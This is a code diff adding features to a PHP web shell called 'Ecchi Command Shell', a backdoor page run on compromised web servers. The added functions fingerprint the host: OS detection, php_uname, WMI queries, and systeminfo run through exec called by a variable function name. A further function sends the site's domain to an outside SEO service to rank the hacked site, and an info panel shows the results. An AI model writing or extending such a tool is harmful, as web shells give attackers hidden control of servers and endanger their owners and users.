@@ -45,6 +45,59 @@ class EcchiShell
     }
 
     /**
+     * Summary of cURL
+     * @param mixed $url
+     * @param mixed $postFields
+     * @param mixed $post
+     * @return bool|string
+     */
+    private function cURL($url, $post = false, $postFields = [])
+    {
+        $ch = curl_init();
+
+        if ($post) {
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $url,
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => http_build_query($postFields)
+            ]);
+        } else {
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $url,
+                CURLOPT_CUSTOMREQUEST => 'GET'
+            ]);
+        }
+
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $respone = curl_exec($ch);
+        curl_close($ch);
+
+        return $respone;
+    }
+
+    /**
+     * Summary of SEORank
+     * @return array|string|null
+     */
+    public function SEORank()
+    {
+        $postData = [
+            "getStatus" => "1",
+            "siteID" => "1",
+            "sitelink" => $_SERVER['SERVER_NAME'],
+            "da" => "1",
+            "pa" => "1",
+            "alexa" => "1"
+        ];
+
+        $getRank = $this->cURL("https://www.checkmoz.com/bulktool", true, $postData);
+        preg_match_all('/(.*?)<\/td>/', $getRank, $get);
+        $getSEO = preg_replace('/<td>/', '', $get[1]);
+
+        return $getSEO;
+    }
+
+    /**
      * Summary of getDisable
      * @param mixed $act
      * @return mixed
@@ -58,6 +111,67 @@ class EcchiShell
         } else {
             return $in("disable_functions");
         }
+    }
+
+    public function getOS()
+    {
+        if (substr(strtoupper(PHP_OS), 0, 3) == "WIN") {
+            return "Windows";
+        } else {
+            return "Linux";
+        }
+    }
+
+    /**
+     * Summary of getInformationSytem
+     * @return float|string
+     */
+    public function getInformationSytem()
+    {
+        $output = '';
+
+        if ($this->getOS() === "Linux") {
+            $output = php_uname();
+        } else {
+            if (class_exists('COM')) {
+                $wmi = new COM('winmgmts://');
+                $os = $wmi->ExecQuery('SELECT * FROM Win32_OperatingSystem');
+                foreach ($os as $os_info) {
+                    $output .= 'Operating System: ' . $os_info->Caption . PHP_EOL;
+                    $output .= 'Kernel Type: ' . $os_info->OSArchitecture . PHP_EOL;
+                    $output .= 'Version: ' . $os_info->Version . PHP_EOL;
+                }
+            } else {
+                $result = [];
+                $getExecution = "exec";
+                $getExecution("systeminfo", $result);
+                if (!empty($getExecution)) {
+                    foreach ($result as $line) {
+                        if (strpos($line, 'OS Name:') !== false) {
+                            $os_name = trim(str_replace('OS Name:', '', $line));
+                            $output .= "<br>Operating System: " . $os_name . PHP_EOL;
+                        } elseif (strpos($line, 'System Type:') !== false) {
+                            $kernel_type = trim(str_replace('System Type:', '', $line));
+                            $output .= '<br>Kernel Type: ' . $kernel_type . PHP_EOL;
+                        } elseif (strpos($line, 'OS Version:') !== false) {
+                            $version = trim(str_replace('OS Version:', '', $line));
+                            $output .= '<br>Version: ' . $version . PHP_EOL;
+                        } else if (strpos($line, 'Host Name' !== false)) {
+                            $host_name = trim(str_replace('Host Name:', '', $line));
+                            $output .= '<br>User: ' . $host_name . PHP_EOL;
+                        } else if (strpos($line, 'BIOS Version:') !== false) {
+                            $bios = trim(str_replace('BIOS Version:', '', $line));
+                            $output .= '<br>Bios: ' . $bios . PHP_EOL;
+                            break;
+                        }
+                    }
+                } else {
+                    $output = "Can't Get Information System";
+                }
+            }
+        }
+
+        return $output;
     }
 
     /**
@@ -89,6 +203,21 @@ class EcchiShell
             $this->setResult($this->result);
         }
     }
+
+    /**
+     * Summary of getServerSoftware
+     * @return mixed
+     */
+    public function getServerSoftware()
+    {
+        return isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : null;
+    }
+
+    public function getPHPVersion()
+    {
+        return phpversion();
+    }
+
 
     /**
      * @return mixed
@@ -143,7 +272,8 @@ $ecchishell = new EcchiShell;
 
     <!-- CSS -->
     <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
 
     <style type="text/css">
         ::-webkit-scrollbar {
@@ -160,16 +290,94 @@ $ecchishell = new EcchiShell;
             -webkit-box-shadow: inset 0 0 6px #00ffff;
         }
 
+        .offcanvas-body,
+        .offcanvas-header {
+            background-color: #000;
+            border: 1px solid #00ffff;
+        }
+
+        .offcanvas {
+            margin-top: 10%;
+            height: 62%;
+            box-shadow: 0px 0px 10px 0px #00ffff;
+        }
+
         .custom-card {
             background-color: #000;
             border: 1px solid #00ffff;
             box-shadow: 0px 0px 10px 0px #00ffff;
             color: #43C6AC;
         }
+
+        .fixed-top-right {
+            position: fixed;
+            top: 17px;
+            right: 30px;
+            z-index: 1032;
+            width: 150px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            box-sizing: border-box;
+        }
+
+        .fixed-top-right:hover {
+            border: 1px solid #00ffff;
+            background-color: #000;
+        }
+
+        @media only screen and (max-width: 767.98px) {
+            .fixed-top-right {
+                width: 80px;
+                top: 20px;
+                right: 15px;
+            }
+
+            .offcanvas {
+                width: 50%;
+                margin-top: 25%;
+            }
+        }
     </style>
 </head>
 
 <body class="bg-dark">
+    <button class="btn fixed-top-right btn-sm opacity-75 custom-card animate__animated animate__fadeInBottomRight"
+        type="button" data-bs-toggle="offcanvas" data-bs-target="#MyMenuShell" aria-controls="MyMenuShell"
+        aria-expanded="false" aria-label="Toggle navigation">
+        <img src="https://i.ibb.co/WVrL2Tk/IMG-20190901-WA0263.jpg" alt="Toggle Menu" class="img-fluid">
+    </button>
+
+    <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="MyMenuShell" aria-labelledby="MyMenuShell">
+        <div class="offcanvas-header">
+            <h5 class="offcanvas-title" id="MyMenuShell">Server Info</h5>
+            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+        </div>
+        <div class="offcanvas-body small">
+            <p>
+                Rank Alexa : <span>
+                    <?= $ecchishell->SEORank()[4] ?>
+                </span> |
+                DA : <span>
+                    <?= $ecchishell->SEORank()[2] ?>
+                </span> |
+                PA : <span>
+                    <?= $ecchishell->SEORank()[3] ?>
+                </span>
+            </p>
+            <p>OS : <span>
+                    <?= $ecchishell->getOS() ?>
+                </span></p>
+            <p>PHP Version : <span>
+                    <?= $ecchishell->getPHPVersion() ?>
+                </span></p>
+            <p>Software : <span>
+                    <?= $ecchishell->getServerSoftware() ?>
+                </span></p>
+            <p>Information System : <span>
+                    <?= $ecchishell->getInformationSytem() ?>
+                </span></p>
+        </div>
+    </div>
+
     <div class="container-fluid">
         <div class="card card-body text-center mt-2 custom-card">
             <h3>Ecchi Command Shell</h3>
